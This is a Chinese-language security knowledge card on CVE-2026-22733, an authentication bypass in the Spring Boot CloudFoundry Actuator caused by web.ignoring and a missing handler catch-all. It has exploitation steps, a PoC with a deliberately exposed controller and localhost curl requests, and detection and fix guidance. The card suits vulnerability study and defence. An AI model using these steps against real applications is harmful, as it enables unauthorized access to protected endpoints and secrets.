---
id: web-java-framework-spring-cloudfoundry-actuator-ignoring-bypass
title: CVE-2026-22733 Spring Boot CloudFoundry Actuator：web.ignoring 整段路径 + HandlerMapping 无 catch-all 导致认证绕过
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-cloudfoundry-actuator-path-ignoring-bypass
aliases:
- CVE-2026-22733
- Spring Boot Actuator 认证绕过
- CloudFoundry Actuator 绕过
- cloudfoundryapplication 未授权
- IgnoredCloudFoundryPathsWebSecurityCustomizer
- web.ignoring 认证绕过
tags:
- java
- spring-boot
- spring-security
- actuator
- cloudfoundry
- auth-bypass
- handler-mapping
- cve-2026-22733
cve:
- CVE-2026-22733
severity: high
confidence: high
status: verified
affected_versions: 4.0.0-4.0.3、3.5.0-3.5.11、3.4.0-3.4.14、3.3.0-3.3.17、2.7.0-2.7.31（原文标注；原文实测 2.7.8 可利用、2.7.18 返回 401）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V37
  verified_at: '2026-11-05T06:06:09+08:00'
  notes: 已对照原文及3张截图核对：2.7.8 的 web.ignoring('/cloudfoundryapplication/**') + CloudFoundryWebEndpointServletHandlerMapping 无 catch-all 导致自定义 Controller 未认证访问，截图 admin 200、secrets 泄露、/normal 弹登录，均一致。注意原文版本信息自相矛盾：影响区间含 2.7.0-2.7.31/3.3.0-3.3.17 等，但正文实测 2.7.18 与 3.3.13 均为选择性忽略并返回 401，仅 2.7.8 复现成功；卡片已在 affected_versions 与正文标注该差异，未据此断言所有区间可利用。未在本机复现。
---

## 一句话结论

Spring Boot 的 CloudFoundry Actuator 自动配置在旧版本中用 `web.ignoring().requestMatchers(new AntPathRequestMatcher("/cloudfoundryapplication/**"))` 让 Spring Security 完全跳过整个前缀，而 `CloudFoundryWebEndpointServletHandlerMapping` 只处理已注册的 CloudFoundry 端点、未知路径返回 `null` 后继续 fall through 到 `RequestMappingHandlerMapping`；因此任何映射到 `/cloudfoundryapplication/**` 的自定义 Controller 都会被未认证访问。

## 原理

- **第一层：Security 整段忽略**。`CloudFoundryActuatorAutoConfiguration$IgnoredCloudFoundryPathsWebSecurityCustomizer` 实现 `WebSecurityCustomizer`，在 `customize(WebSecurity web)` 中调用 `web.ignoring()`。在 Spring Boot 2.7.0-2.7.8 中，匹配器是 `AntPathRequestMatcher("/cloudfoundryapplication/**")`，即整个前缀都不进入 Security FilterChain，业务代码里写的 `.antMatchers("/cloudfoundryapplication/**").authenticated()` 不会生效。
- **设计初衷**：CloudFoundry 平台通过 Handler 级别的 `CloudFoundrySecurityInterceptor` 做认证，而不是 Spring Security FilterChain，所以框架有意把该前缀从 Security 放行，交给 CloudFoundry 自己的拦截器。
- **第二层：HandlerMapping 缺口**。`CloudFoundryWebEndpointServletHandlerMapping` 只识别注册过的 CloudFoundry 端点；对 `/cloudfoundryapplication/admin` 这类未注册路径返回 `null`。Spring MVC 会继续遍历下一个 HandlerMapping，`RequestMappingHandlerMapping` 正好能匹配自定义的 `@RequestMapping("/cloudfoundryapplication")` Controller，于是请求进入业务方法。
- **两层叠加**：Security 已放行，Handler 级别的 `CloudFoundrySecurityInterceptor` 又没有机会执行，最终未认证返回 200。
- **版本差异**：2.7.9+ 把“忽略整个前缀”改成只忽略已注册端点路径（`pathMappedEndpoints.getAllPaths()` + `BASE_PATH`），未知路径会重新进入 Security 而返回 401；但 `CloudFoundryWebEndpointServletHandlerMapping` 仍然没有 catch-all，原文认为 2.7.9-2.7.18 仍存在缺口（原文自身在 2.7.18 实测为 401，实际可利用性需按版本验证）。
- **完整修复**：在 `CloudFoundryWebEndpointServletHandlerMapping#initHandlerMethods()` 中注册 `/**` 的 catch-all，对所有未匹配请求直接返回 `403`，阻止 fall through 到自定义 Controller。

## 触发条件

- Spring Boot 版本在受影响区间（原文实测 2.7.8；2.7.18 已返回 401）。
- 配置 `spring.main.cloud-platform=CLOUD_FOUNDRY` 且 `management.cloudfoundry.enabled=true`，使 CloudFoundry Actuator 自动配置生效。
- 引入 `spring-boot-starter-web`、`spring-boot-starter-security`、`spring-boot-starter-actuator`。
- 应用存在映射在 `/cloudfoundryapplication/**` 下的自定义 Controller（或该前缀下有任何未注册的业务端点）。
- Security 配置未额外用 Filter 阻断该前缀的未知路径。

## 利用步骤

1. 确认目标日志出现 `Will not secure Ant [pattern='/cloudfoundryapplication/**']`（2.7.0-2.7.8）或 `Will not secure Or [...已注册端点...]`（2.7.9+），判断自动配置版本行为。
2. 枚举 `/cloudfoundryapplication/` 下的业务路径（如 `/admin`、`/secrets`），这些路径不是注册的 Actuator 端点。
3. 不带任何 Cookie/Authorization 直接请求，观察是否返回 200；同时请求一个普通受保护端点（如 `/normal`）作为对照，应返回 401。
4. 若返回 200，说明请求经 `web.ignoring` 跳过 Security、经 HandlerMapping fall through 进入自定义 Controller，认证绕过成立。

## PoC

受影响配置（Spring Boot 2.7.8）：

```properties
spring.main.cloud-platform=CLOUD_FOUNDRY
management.cloudfoundry.enabled=true
management.endpoints.web.exposure.include=*
```

自定义 Controller：

```java
@RestController
@RequestMapping("/cloudfoundryapplication")
public class CloudFoundryAppController {
    @GetMapping("/admin")
    public String admin() {
        return "ADMIN_ENDPOINT_EXPOSED - This should require authentication!";
    }

    @GetMapping("/secrets")
    public String secrets() {
        return "SECRET_DATA: database_password=root123, api_key=sk-secret-key";
    }
}
```

Security 配置中即使写了该前缀需要认证，也会被自动配置覆盖：

```java
http.authorizeRequests()
    .antMatchers("/cloudfoundryapplication/**").authenticated()
    .anyRequest().authenticated();
```

验证：

```bash
curl -i http://localhost:8080/cloudfoundryapplication/admin
# HTTP/1.1 200，返回 ADMIN_ENDPOINT_EXPOSED...

curl -i http://localhost:8080/cloudfoundryapplication/secrets
# HTTP/1.1 200，返回数据库密码与 api_key

curl -i http://localhost:8080/normal
# HTTP/1.1 401，说明 Security 配置本身有效
```

修复后同一请求应返回 `403`（catch-all）或 `401`（选择性忽略版本）。

## 变体与关联

- 只要自定义 Controller 映射在 `/cloudfoundryapplication/**` 下，任意子路径都可能在旧版本被未认证访问；不限于 `/admin`、`/secrets`。
- 2.7.9+ 的选择性忽略版本中，已注册的 Actuator 端点仍按设计放行；未注册路径是否绕过取决于 Security 与 HandlerMapping 的组合，需实测。
- 关联：[[web-java-framework-spring-actuator-heapdump-credential-leak]]（同为 Actuator 暴露面，但那条是端点本身泄露堆内存）。
- 关联：[[web-java-framework-spring-custom-auth-path-parsing-bypass]]（同属 Security 配置与实际路由解析不一致导致的认证绕过）。

## 检测与防御

- **日志检测**：启动日志出现 `You are asking Spring Security to ignore Ant [pattern='/cloudfoundryapplication/**']` 或 `Will not secure Ant [pattern='/cloudfoundryapplication/**']`；访问日志中 `/cloudfoundryapplication/` 下的未知子路径返回 200。
- **依赖检测**：核对 Spring Boot 版本是否在受影响区间；检查是否设置 `spring.main.cloud-platform=CLOUD_FOUNDRY` 与 `management.cloudfoundry.enabled=true`。
- **修复**：升级到包含 catch-all 的版本（原文给出 4.0.4 / 3.5.12 的修复逻辑）；将自定义端点移出 `/cloudfoundryapplication/` 路径；在 Security 配置中增加最高优先级的 Filter，对该前缀下未注册路径直接返回 403。
- **加固**：非 CloudFoundry 环境不要启用 CloudFoundry 自动配置；定期审计 Actuator 暴露端点；对 `/cloudfoundryapplication/**` 做网关层访问控制。
